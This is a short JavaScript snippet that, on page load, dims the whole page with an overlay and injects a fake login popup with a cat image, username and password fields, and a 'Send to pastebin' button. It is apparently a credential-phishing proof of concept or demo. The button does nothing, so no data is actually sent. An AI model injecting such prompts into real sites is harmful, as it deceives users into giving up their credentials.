window.onload = function(){
  var coverdiv_43215143 = '<div id="coverdiv_43215143" style="z-index:990; position: fixed; top: 0; left: 0; bottom: 0; right: 0; height: 100%; width: 100%; background-color: rgba(0, 0, 0, 0.3);"></div>'
  document.body.innerHTML += coverdiv_43215143;
  inner_cat_div_content= '<img src="credential_cat.png" style="width:95%;display: block; margin: auto;"><br><label for="u">Username: </label><input type="text" id="u" name="u"><br><br><label for="pass">Password:</label> <input type="password" id="p" name="p"><br><br><button type="button">Send to pastebin</button>'
  var catdiv_43215143 = '<div id="catdiv_43215143" style="z-index:999;position: fixed;left: 33%; width: 33%; background-color: #F0F0F0;  border: 2px solid DarkGray; border-radius: 10px;padding: 10px;text-align: center;">'+inner_cat_div_content+'</div>'
  document.body.innerHTML += catdiv_43215143;
}
